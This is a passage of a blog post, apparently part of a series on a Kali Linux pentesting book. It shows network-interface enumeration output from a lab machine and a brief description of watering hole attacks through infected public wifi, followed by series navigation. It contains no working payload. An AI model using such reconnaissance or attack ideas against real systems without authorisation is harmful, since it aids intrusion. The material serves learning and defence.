+</span></span><span class="line"><span class="cl">Speed                         : <span class="m">1073</span> Mbps
+</span></span><span class="line"><span class="cl">MTU                           : <span class="m">1500</span>
+</span></span><span class="line"><span class="cl">In octets                     : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Out octets                    : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Interface                     : <span class="o">[</span> up <span class="o">]</span> WAN Miniport <span class="o">(</span>IP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Id                            : <span class="m">8</span>
+</span></span><span class="line"><span class="cl">Mac Address                   : 88:e2:20:52:41:53
+</span></span><span class="line"><span class="cl">Type                          : ethernet-csmacd
+</span></span><span class="line"><span class="cl">Speed                         : <span class="m">1073</span> Mbps
+</span></span><span class="line"><span class="cl">MTU                           : <span class="m">1500</span>
+</span></span><span class="line"><span class="cl">In octets                     : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Out octets                    : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Interface                     : <span class="o">[</span> down <span class="o">]</span> RAS Async Adapter
+</span></span><span class="line"><span class="cl">Id                            : <span class="m">9</span>
+</span></span><span class="line"><span class="cl">Mac Address                   : 20:41:53:59:4e:ff
+</span></span><span class="line"><span class="cl">Type                          : ppp
+</span></span><span class="line"><span class="cl">Speed                         : <span class="m">0</span> Mbps
+</span></span><span class="line"><span class="cl">MTU                           : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">In octets                     : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Out octets                    : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Interface                     : <span class="o">[</span> up <span class="o">]</span> WAN Miniport <span class="o">(</span>IKEv2<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Id                            : <span class="m">10</span>
+</span></span><span class="line"><span class="cl">Mac Address                   : 00:00:00:00:00:00
+</span></span><span class="line"><span class="cl">Type                          : unknown
+</span></span><span class="line"><span class="cl">Speed                         : <span class="m">0</span> Mbps
+</span></span><span class="line"><span class="cl">MTU                           : <span class="m">1480</span>
+</span></span><span class="line"><span class="cl">In octets                     : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Out octets                    : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Interface                     : <span class="o">[</span> up <span class="o">]</span> Intel<span class="o">(</span>R<span class="o">)</span> PRO/1000 MT Desktop Adapter
+</span></span><span class="line"><span class="cl">Id                            : <span class="m">11</span>
+</span></span><span class="line"><span class="cl">Mac Address                   : 08:00:27:d7:cc:d8
+</span></span><span class="line"><span class="cl">Type                          : ethernet-csmacd
+</span></span><span class="line"><span class="cl">Speed                         : <span class="m">1000</span> Mbps
+</span></span><span class="line"><span class="cl">MTU                           : <span class="m">1500</span>
+</span></span><span class="line"><span class="cl">In octets                     : <span class="m">44474455</span>
+</span></span><span class="line"><span class="cl">Out octets                    : <span class="m">33542944</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Interface                     : <span class="o">[</span> up <span class="o">]</span> Microsoft ISATAP Adapter
+</span></span><span class="line"><span class="cl">Id                            : <span class="m">12</span>
+</span></span><span class="line"><span class="cl">Mac Address                   : 00:00:00:00:00:00
+</span></span><span class="line"><span class="cl">Type                          : unknown
+</span></span><span class="line"><span class="cl">Speed                         : <span class="m">0</span> Mbps
+</span></span><span class="line"><span class="cl">MTU                           : <span class="m">1280</span>
+</span></span><span class="line"><span class="cl">In octets                     : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Out octets                    : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Interface                     : <span class="o">[</span> up <span class="o">]</span> Microsoft ISATAP Adapter <span class="c1">#2</span>
+</span></span><span class="line"><span class="cl">Id                            : <span class="m">13</span>
+</span></span><span class="line"><span class="cl">Mac Address                   : 00:00:00:00:00:00
+</span></span><span class="line"><span class="cl">Type                          : unknown
+</span></span><span class="line"><span class="cl">Speed                         : <span class="m">0</span> Mbps
+</span></span><span class="line"><span class="cl">MTU                           : <span class="m">1280</span>
+</span></span><span class="line"><span class="cl">In octets                     : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Out octets                    : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Interface                     : <span class="o">[</span> up <span class="o">]</span> Intel<span class="o">(</span>R<span class="o">)</span> PRO/1000 MT Desktop Adapter <span class="c1">#2</span>
+</span></span><span class="line"><span class="cl">Id                            : <span class="m">14</span>
+</span></span><span class="line"><span class="cl">Mac Address                   : 08:00:27:66:c5:26
+</span></span><span class="line"><span class="cl">Type                          : ethernet-csmacd
+</span></span><span class="line"><span class="cl">Speed                         : <span class="m">1000</span> Mbps
+</span></span><span class="line"><span class="cl">MTU                           : <span class="m">1500</span>
+</span></span><span class="line"><span class="cl">In octets                     : <span class="m">6452</span>
+</span></span><span class="line"><span class="cl">Out octets                    : <span class="m">41251</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Interface                     : <span class="o">[</span> up <span class="o">]</span> Intel<span class="o">(</span>R<span class="o">)</span> PRO/1000 MT Desktop Adapter-QoS Packet Scheduler-0000
+</span></span><span class="line"><span class="cl">Id                            : <span class="m">15</span>
+</span></span><span class="line"><span class="cl">Mac Address                   : 08:00:27:d7:cc:d8
+</span></span><span class="line"><span class="cl">Type                          : ethernet-csmacd
+</span></span><span class="line"><span class="cl">Speed                         : <span class="m">1000</span> Mbps
+</span></span><span class="line"><span class="cl">MTU                           : <span class="m">1500</span>
+</span></span><span class="line"><span class="cl">In octets                     : <span class="m">44474455</span>
+</span></span><span class="line"><span class="cl">Out octets                    : <span class="m">33542944</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Interface                     : <span class="o">[</span> up <span class="o">]</span> Intel<span class="o">(</span>R<span class="o">)</span> PRO/1000 MT Desktop Adapter-WFP LightWeight Filter-0000
+</span></span><span class="line"><span class="cl">Id                            : <span class="m">16</span>
+</span></span><span class="line"><span class="cl">Mac Address                   : 08:00:27:d7:cc:d8
+</span></span><span class="line"><span class="cl">Type                          : ethernet-csmacd
+</span></span><span class="line"><span class="cl">Speed                         : <span class="m">1000</span> Mbps
+</span></span><span class="line"><span class="cl">MTU                           : <span class="m">1500</span>
+</span></span><span class="line"><span class="cl">In octets                     : <span class="m">44474455</span>
+</span></span><span class="line"><span class="cl">Out octets                    : <span class="m">33542944</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Interface                     : <span class="o">[</span> up <span class="o">]</span> Intel<span class="o">(</span>R<span class="o">)</span> PRO/1000 MT Desktop Adapter <span class="c1">#2-QoS Packet Scheduler-0000</span>
+</span></span><span class="line"><span class="cl">Id                            : <span class="m">17</span>
+</span></span><span class="line"><span class="cl">Mac Address                   : 08:00:27:66:c5:26
+</span></span><span class="line"><span class="cl">Type                          : ethernet-csmacd
+</span></span><span class="line"><span class="cl">Speed                         : <span class="m">1000</span> Mbps
+</span></span><span class="line"><span class="cl">MTU                           : <span class="m">1500</span>
+</span></span><span class="line"><span class="cl">In octets                     : <span class="m">6452</span>
+</span></span><span class="line"><span class="cl">Out octets                    : <span class="m">41251</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Interface                     : <span class="o">[</span> up <span class="o">]</span> Intel<span class="o">(</span>R<span class="o">)</span> PRO/1000 MT Desktop Adapter <span class="c1">#2-WFP LightWeight Filter-0000</span>
+</span></span><span class="line"><span class="cl">Id                            : <span class="m">18</span>
+</span></span><span class="line"><span class="cl">Mac Address                   : 08:00:27:66:c5:26
+</span></span><span class="line"><span class="cl">Type                          : ethernet-csmacd
+</span></span><span class="line"><span class="cl">Speed                         : <span class="m">1000</span> Mbps
+</span></span><span class="line"><span class="cl">MTU                           : <span class="m">1500</span>
+</span></span><span class="line"><span class="cl">In octets                     : <span class="m">6452</span>
+</span></span><span class="line"><span class="cl">Out octets                    : <span class="m">41251</span>
+</span></span></code></pre></div>
+<h2 class="relative group">9. Watering hole attacks 
+    <div id="9-watering-hole-attacks" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#9-watering-hole-attacks" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>This section is more of a way to infect employees that work at an unpenetrable organisation which have though of every firewall technique and built up a wall so strong that it seems impossible to get in.</p>
+<p>This is similar to <strong>medival times</strong> where the kings will build the best defense with water around the castle with a drop gate, have guards monitor day and night on the lookout for any wanderers to protect their people.</p>
+<p>A technique to get in would be to just sit and wait for someone to leave the castle to buy things at the markets outside the castle because the king charges too much for a coffee. You would wait until they&rsquo;re distracted and go behind them in the shadows while they head back inside the castle.</p>
+<p>In the <strong>Cyber World</strong> this is known as a watering hole attack which finds a tiny hole in the wall and go all in. This can be done by infecting a public wifi network e.g. coffee shops, bakeries, Mc Donalds and wait for them to connect which will allow us to plant a payload to be executed inside the organisation and boom, I&rsquo;m sorry buts it&rsquo;s already over from there.</p>
+
+<h2 class="relative group">10. Conclusion 
+    <div id="10-conclusion" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#10-conclusion" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Well that&rsquo;s enough of me yappin about computers, this book series is realy enjoyable and once I&rsquo;m completed I will through myself in the trenches of the <strong>Wire</strong> in hopes to get better to defend the innocents against the <strong>Black Hat</strong> which their  sole purpose on this earth is to wreak havoc.</p>
+<p>Motivated by <strong>Money</strong>, <strong>Power</strong>, <strong>Radical</strong> political views, extreme methods to spread word. They opperate underground, unreachable from the real world where they piggy back off Hostpitals, Charities, small start-ups, vulnerable people and even lost pet posters that offer a rewards for finding the pet. These are people that have their brain and &ldquo;souls&rdquo; fogged with these motives which bring a disgrace to humanity.</p>
+<p>They may have reasons to do these things such as to provide for families but shutting down hostpitals, calling lost pet owners to send money to a wallet otherwise they won&rsquo;t release their &ldquo;found&rdquo; lost pet is crossing the line. There are better ways to make money and just know, <strong>The internet never forgets</strong> and we will find you, just a matter of when.</p>
+<p>Ooooooookkkkk that went a little dark ∩｡• ᵕ •｡∩ ♡</p>
+<p>Urm just wanted to say that if you&rsquo;re reading this there will be more, I am starting to like this blog thing. It started out as a portfolio in <strong>Part 1</strong> but it felt boring so I just started writing what I wanted. It feels freeing and actualy fun to learn again, you can do it with almost all discipline just add a bit of creativity in your work and be grateful for where you are currently in time.</p>
+<p>This is too long I should shut up now, see you in the next one.</p>
+
+
+
+
+
+<img src="Lain-dance.gif" alt="alt text" style="width: auto; height: auto;">
+
+
+          
+          
+          
+        </div>
+
+        
+
+        
+  <details class="mt-2 mb-5 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 ml-0">
+    
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-primary-200 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-primary-800 dark:text-neutral-100">
+    Ultimate-Kali-Linux-Book -
+    This article is part of a series.
+  </summary>
+  
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="/posts/ultimate-kali-linux-book/part-1-buidling-a-penetration-testing-labs/">
+          Part 2:
+          Part 1 Building a Penetesting Lab
+        </a>
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="/posts/ultimate-kali-linux-book/part-2-reconnaissance-and-footprint/">
+          Part 3:
+          Part 2 Reconnaissance and Footprint
+        </a>
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="/posts/ultimate-kali-linux-book/part-3-exploring-active-reconnaissance-techniques/">
+          Part 4:
+          Part 3 Exploring Active Reconnaissance Techniques
+        </a>
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shells/">
+          Part 5:
+          Part 5 Understanding Reverse and Binding Shell
+        </a>
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="/posts/ultimate-kali-linux-book/part-4-performing-vulnerability-assessments/">
+          Part 6:
+          Part 4 Performing Vulnerability Assessments
+        </a>
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        Part 7:
+        This Article
+      </div>
+    
+  
+    
+      <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        <a href="/posts/ultimate-kali-linux-book/part-7-advanced-network-penetration-testing-post-exploitation/">
+          Part 8:
+          Part 7 Advanced Network Penetration Testing Post Exploitation
+        </a>
+      </div>
+    
+  
+
+
+  </details>
+
+
+        
+
+        
+  
+  
+    <h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
+    <section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
+      
+        
+
+  <a href="/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shells/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+
+
+    <div class="px-6 py-4">
+      
+        <div
+          class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shells/">
+          Part 5 Understanding Reverse and Binding Shell
+        </div>
+      
+
+
+      <div class="text-sm text-neutral-500 dark:text-neutral-400">
+        
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2024-05-22T09:09:02&#43;00:00">22 May, 2024</time><span class="px-2 text-primary-500">&middot;</span><span>1064 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/categories/walkthrough/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Walkthrough
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/tags/networking/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Networking
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/tags/shells/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Shells
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+      </div>
+
+      
+        <div class="py-1 prose dark:prose-invert">
+          
+        </div>
+      
+    </div>
+    <div class="px-6 pt-4 pb-2"></div>
+  </div>
+</a>
+
+      
+        
+
+  <a href="/posts/ultimate-kali-linux-book/part-4-performing-vulnerability-assessments/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+
+
+    <div class="px-6 py-4">
+      
+        <div
+          class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/posts/ultimate-kali-linux-book/part-4-performing-vulnerability-assessments/">
+          Part 4 Performing Vulnerability Assessments
+        </div>
+      
+
+
+      <div class="text-sm text-neutral-500 dark:text-neutral-400">
+        
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2024-04-26T12:22:20&#43;00:00">26 Apr, 2024</time><span class="px-2 text-primary-500">&middot;</span><span>1379 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">7 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/categories/walkthrough/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Walkthrough
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/tags/osint/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    OSINT
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/tags/vulnerability/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Vulnerability
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+      </div>
+
+      
+        <div class="py-1 prose dark:prose-invert">
+          
+        </div>
+      
+    </div>
+    <div class="px-6 pt-4 pb-2"></div>
+  </div>
+</a>
+
+      
+        
+
+  <a href="/posts/ultimate-kali-linux-book/part-3-exploring-active-reconnaissance-techniques/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+
+
+    <div class="px-6 py-4">
+      
+        <div
+          class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/posts/ultimate-kali-linux-book/part-3-exploring-active-reconnaissance-techniques/">
+          Part 3 Exploring Active Reconnaissance Techniques
+        </div>
+      
+
+
+      <div class="text-sm text-neutral-500 dark:text-neutral-400">
+        
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2024-04-09T10:32:25&#43;00:00">9 Apr, 2024</time><span class="px-2 text-primary-500">&middot;</span><span>1327 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">7 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/categories/walkthrough/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Walkthrough
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/tags/osint/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    OSINT
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/tags/dns/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    DNS
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+      </div>
+
+      
+        <div class="py-1 prose dark:prose-invert">
+          
+        </div>
+      
+    </div>
+    <div class="px-6 pt-4 pb-2"></div>
+  </div>
+</a>
+
+      
+        
+
+  <a href="/posts/ultimate-kali-linux-book/part-2-reconnaissance-and-footprint/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+
+
+    <div class="px-6 py-4">
+      
+        <div
+          class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/posts/ultimate-kali-linux-book/part-2-reconnaissance-and-footprint/">
+          Part 2 Reconnaissance and Footprint
+        </div>
+      
+
+
+      <div class="text-sm text-neutral-500 dark:text-neutral-400">
+        
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2024-03-24T19:14:23&#43;00:00">24 Mar, 2024</time><span class="px-2 text-primary-500">&middot;</span><span>1163 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">6 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/categories/walkthrough/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Walkthrough
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/tags/osint/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    OSINT
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/tags/anonymity/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Anonymity
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+      </div>
+
+      
+        <div class="py-1 prose dark:prose-invert">
+          
+        </div>
+      
+    </div>
+    <div class="px-6 pt-4 pb-2"></div>
+  </div>
+</a>
+
+      
+        
+
+  <a href="/posts/ultimate-kali-linux-book/part-1-buidling-a-penetration-testing-labs/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+
+
+    <div class="px-6 py-4">
+      
+        <div
+          class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/posts/ultimate-kali-linux-book/part-1-buidling-a-penetration-testing-labs/">
+          Part 1 Building a Penetesting Lab
+        </div>
+      
+
+
+      <div class="text-sm text-neutral-500 dark:text-neutral-400">
+        
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2024-03-17T20:32:22&#43;00:00">17 Mar, 2024</time><span class="px-2 text-primary-500">&middot;</span><span>709 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/categories/walkthrough/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Walkthrough
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+        
+      
+        
+          
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/tags/lab/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Lab
+  </span>
+</span>
+
+              </span>
+            
+              <span
+                class="mr-2 mt-[0.5rem]"
+                onclick="window.open(&#34;/tags/pentesting/&#34;,'_self');return false;">
+                <span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Pentesting
+  </span>
+</span>
+
+              </span>
+            
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+      </div>
+
+      
+        <div class="py-1 prose dark:prose-invert">
+          
+        </div>
+      
+    </div>
+    <div class="px-6 pt-4 pb-2"></div>
+  </div>
+</a>
+
+      
+    </section>
+  
+
+
+      </div>
+
+      
+      
+        
+        
+          
+          
+        
+        
+        
+        <script
+          type="text/javascript"
+          src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
+          integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
+          data-oid="views_posts/Ultimate-Kali-Linux-Book/Part-6-All-On-Networking-Penetration-Baby/index.md"
+          data-oid-likes="likes_posts/Ultimate-Kali-Linux-Book/Part-6-All-On-Networking-Penetration-Baby/index.md"></script>
+      
+
+    </section>
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/posts/ultimate-kali-linux-book/part-5-understanding-reverse-and-binding-shells/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Part 5 Understanding Reverse and Binding Shell</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2024-05-22T09:09:02&#43;00:00">22 May, 2024</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
